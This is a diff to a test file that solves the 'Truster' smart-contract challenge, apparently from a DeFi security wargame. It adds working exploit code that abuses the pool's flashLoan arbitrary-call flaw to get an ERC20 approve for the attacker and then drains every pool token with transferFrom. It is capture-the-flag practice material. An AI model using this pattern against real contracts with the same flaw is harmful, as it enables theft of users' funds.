@@ -36,13 +36,38 @@ describe('[Challenge] Truster', function () {
         /** YOUR EXPLOIT GOES HERE */
         const accounts = await ethers.getSigners();
         const attacker = accounts[1];
-    });
+ 
+        /*
+         * We can call any function with params since flashLoan function directly use
+         * "call" with "calldata data" parameter. We cannot transfer any money since 
+         * it checks the balance at the end of the function however we can use 
+         * approve function (thanks to ERC20) and transfer the approved amount later.
+         */
+
+        const poolInterface = new ethers.utils.Interface([
+            "function approve(address spender, uint256 amount)"
+        ]);
+
+        const targetBalance = TOKENS_IN_POOL;
+
+        const callData = poolInterface.encodeFunctionData(
+            "approve", [attacker.address, targetBalance]
+        );
+        
+        let tx = await this.pool.flashLoan(0, attacker.address, this.token.address, callData);
+        await tx.wait();
+        console.log(tx);
+
+        tx = await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, targetBalance);
+        await tx.wait();
+        console.log(tx);
+   });
 
     after(async function () {
         const accounts = await ethers.getSigners();
         const attacker = accounts[1];
-        /** SUCCESS CONDITION */
 
+        /** SUCCESS CONDITION */
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.be.eq(TOKENS_IN_POOL);
